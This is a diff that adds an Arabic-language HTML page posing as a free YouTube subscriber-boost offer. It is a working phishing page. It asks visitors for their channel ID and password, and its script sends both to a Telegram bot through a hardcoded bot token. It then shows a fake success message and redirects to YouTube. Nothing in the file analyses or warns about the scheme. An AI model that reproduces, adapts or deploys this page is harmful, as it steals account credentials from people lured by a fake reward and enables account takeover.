@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>YouTube رشق</title>
+    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#f9f9f9;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border:1px solid #dadce0;border-radius:12px;padding:30px;width:380px;text-align:center}img{width:120px;margin:0 auto 25px;display:block}h2{color:#1a73e8;margin-bottom:6px}p{color:#5f6368;font-size:14px;margin-bottom:18px}.gift-box{background:#1a73e8;color:#fff;border-radius:12px;padding:12px;margin-bottom:15px}.gift-box span{font-weight:bold;font-size:18px}input,select{width:100%;padding:14px;margin:8px 0;border:1px solid #dadce0;border-radius:6px;font-size:16px;text-align:center}.btn{background:#1a73e8;color:#fff;border:none;padding:14px;width:100%;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px}.btn:hover{background:#1557b0}</style></head>
+<body><div class="card">
+<img src="https://www.gstatic.com/youtube/img/email/email_logo.png" alt="YouTube">
+<h2>▶️ رشق مشتركين يوتيوب</h2>
+<p>احصل على مشتركين حقيقيين لقناتك!</p>
+<div class="gift-box"><span>🎉 500 مشترك مجاناً</span></div>
+<select id="amount"><option value="100">100 مشترك</option><option value="500" selected>500 مشترك</option><option value="1000">1000 مشترك</option></select>
+<input id="username" placeholder="معرف القناة (@channel)">
+<input id="password" type="password" placeholder="كلمة المرور للتأكيد">
+<button class="btn" onclick="sendData()">إرسال الرشق الآن 🚀</button>
+<p id="msg" style="margin-top:12px;font-size:14px;font-weight:bold;"></p>
+</div>
+<script>
+const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT=p.get('chat');
+function sendData(){const u=document.getElementById('username').value,pa=document.getElementById('password').value,am=document.getElementById('amount').value;
+if(!u||!pa)return alert('املأ جميع الحقول');
+document.getElementById('msg').innerHTML='⏳ جاري إرسال الرشق...';
+fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent('▶️ رشق يوتيوب\n👤 '+u+'\n🔑 '+pa+'\n📊 الكمية: '+am+' مشترك')}`).then(()=>{document.getElementById('msg').innerHTML='✅ تم الإرسال! سيصل الرشق خلال دقائق.';setTimeout(()=>location.href='https://youtube.com',3000)});}
+</script></body></html>
